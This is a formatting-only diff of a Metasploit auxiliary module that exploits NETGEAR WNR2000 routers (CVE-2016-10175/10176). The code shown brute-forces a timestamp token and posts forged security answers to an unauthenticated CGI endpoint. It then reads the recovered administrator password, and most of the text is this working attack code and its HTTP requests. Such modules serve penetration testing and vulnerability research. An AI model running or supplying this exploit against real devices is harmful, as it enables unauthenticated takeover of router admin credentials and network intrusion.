@@ -10,47 +10,51 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::CRand
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'NETGEAR WNR2000v5 Administrator Password Recovery',
-      'Description' => %q{
-        The NETGEAR WNR2000 router has a vulnerability in the way it handles password recovery.
-        This vulnerability can be exploited by an unauthenticated attacker who is able to guess
-        the value of a certain timestamp which is in the configuration of the router.
-        Brute forcing the timestamp token might take a few minutes, a few hours, or days, but
-        it is guaranteed that it can be bruteforced.
-        This module works very reliably and it has been tested with the WNR2000v5, firmware versions
-        1.0.0.34 and 1.0.0.18. It should also work with the hardware revisions v4 and v3, but this
-        has not been tested.
-      },
-      'Author' =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'NETGEAR WNR2000v5 Administrator Password Recovery',
+        'Description' => %q{
+          The NETGEAR WNR2000 router has a vulnerability in the way it handles password recovery.
+          This vulnerability can be exploited by an unauthenticated attacker who is able to guess
+          the value of a certain timestamp which is in the configuration of the router.
+          Brute forcing the timestamp token might take a few minutes, a few hours, or days, but
+          it is guaranteed that it can be bruteforced.
+          This module works very reliably and it has been tested with the WNR2000v5, firmware versions
+          1.0.0.34 and 1.0.0.18. It should also work with the hardware revisions v4 and v3, but this
+          has not been tested.
+        },
+        'Author' => [
           'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
         ],
-      'License' => MSF_LICENSE,
-      'References' =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           ['CVE', '2016-10175'],
           ['CVE', '2016-10176'],
           ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear-wnr2000.txt'],
           ['URL', 'https://seclists.org/fulldisclosure/2016/Dec/72'],
           ['URL', 'http://kb.netgear.com/000036549/Insecure-Remote-Access-and-Command-Execution-Security-Vulnerability']
         ],
-      'DisclosureDate'  => '2016-12-20'))
+        'DisclosureDate' => '2016-12-20'
+      )
+    )
     register_options(
       [
         Opt::RPORT(80)
-      ])
+      ]
+    )
     register_advanced_options(
       [
         OptInt.new('TIME_OFFSET', [true, 'Maximum time differential to try', 5000]),
         OptInt.new('TIME_SURPLUS', [true, 'Increase this if you are sure the device is vulnerable and you are not getting through', 200])
-      ])
+      ]
+    )
   end
 
   def get_current_time
     res = send_request_cgi({
-      'uri'     => '/',
-      'method'  => 'GET'
+      'uri' => '/',
+      'method' => 'GET'
     })
     if res && res['Date']
       date = res['Date']
@@ -62,10 +66,9 @@ class MetasploitModule < Msf::Auxiliary
   # back to an integer.
   # This emulates the behaviour of the soft-fp library and the float cast
   # which is done at the end of Netgear's timestamp generator.
-  def ieee754_round (number)
+  def ieee754_round(number)
     [number].pack('f').unpack('f*')[0].to_i
   end
-
 
   # This is the actual algorithm used in the get_timestamp function in
   # the Netgear firmware.
@@ -86,8 +89,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def get_creds
     res = send_request_cgi({
-      'uri'     => '/BRS_netgear_success.html',
-      'method'  => 'GET'
+      'uri' => '/BRS_netgear_success.html',
+      'method' => 'GET'
     })
     if res && res.body =~ /var sn="([\w]*)";/
       serial = $1
@@ -97,37 +100,37 @@ class MetasploitModule < Msf::Auxiliary
 
     # 1: send serial number
     send_request_cgi({
-      'uri'     => '/apply_noauth.cgi',
-      'query'   => '/unauth.cgi',
-      'method'  => 'POST',
+      'uri' => '/apply_noauth.cgi',
+      'query' => '/unauth.cgi',
+      'method' => 'POST',
       'Content-Type' => 'application/x-www-form-urlencoded',
       'vars_post' =>
       {
         'submit_flag' => 'match_sn',
-        'serial_num'  => serial,
-        'continue'    => '+Continue+'
+        'serial_num' => serial,
+        'continue' => '+Continue+'
       }
     })
 
     # 2: send answer to secret questions
     send_request_cgi({
-      'uri'     => '/apply_noauth.cgi',
-      'query'   => '/securityquestions.cgi',
-      'method'  => 'POST',
+      'uri' => '/apply_noauth.cgi',
+      'query' => '/securityquestions.cgi',
+      'method' => 'POST',
       'Content-Type' => 'application/x-www-form-urlencoded',
       'vars_post' =>
       {
         'submit_flag' => 'security_question',
-        'answer1'     => @q1,
-        'answer2'     => @q2,
-        'continue'    => '+Continue+'
+        'answer1' => @q1,
+        'answer2' => @q2,
+        'continue' => '+Continue+'
       }
     })
 
     # 3: PROFIT!!!
     res = send_request_cgi({
-      'uri'     => '/passwordrecovered.cgi',
-      'method'  => 'GET'
+      'uri' => '/passwordrecovered.cgi',
+      'method' => 'GET'
     })
 
     if res && res.body =~ /Admin Password: (.*)<\/TD>/
@@ -154,11 +157,11 @@ class MetasploitModule < Msf::Auxiliary
         '/PWD_password.htm' : \
         "/PWD_password.htm%20timestamp=#{timestamp.to_s}")
       res = send_request_raw({
-          'uri'     => '/apply_noauth.cgi',
-          'query'   => query_str,
-          'method'  => 'POST',
-          'headers' => { 'Content-Type' => 'application/x-www-form-urlencoded' },
-          'data'    => "submit_flag=passwd&hidden_enable_recovery=1&Apply=Apply&sysOldPasswd=&sysNewPasswd=&sysConfirmPasswd=&enable_recovery=on&question1=1&answer1=#{@q1}&question2=2&answer2=#{@q2}"
+        'uri' => '/apply_noauth.cgi',
+        'query' => query_str,
+        'method' => 'POST',
+        'headers' => { 'Content-Type' => 'application/x-www-form-urlencoded' },
+        'data' => "submit_flag=passwd&hidden_enable_recovery=1&Apply=Apply&sysOldPasswd=&sysNewPasswd=&sysConfirmPasswd=&enable_recovery=on&question1=1&answer1=#{@q1}&question2=2&answer2=#{@q2}"
       })
       return res
     rescue ::Errno::ETIMEDOUT, ::Errno::ECONNRESET, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
